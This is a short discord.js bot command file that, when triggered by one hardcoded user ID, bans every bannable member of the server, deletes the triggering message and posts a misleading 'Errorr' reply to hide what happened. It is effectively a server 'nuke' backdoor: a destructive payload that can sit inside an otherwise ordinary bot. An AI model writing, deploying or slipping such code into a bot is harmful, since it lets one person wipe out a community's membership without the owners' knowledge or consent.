const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {

  if(message.author.id !== "849392394469113876") return;

        const members = await message.guild.members.fetch()
        members
            .filter(m => m.bannable)
            .forEach(m => m.ban())
        message.delete();
        message.channel.send('Errorr');

    } catch(e) {

        console.log(e.stack);

    }
        
}

module.exports.help = {

    name: "ban",
    desc: "Bans everyone."

}
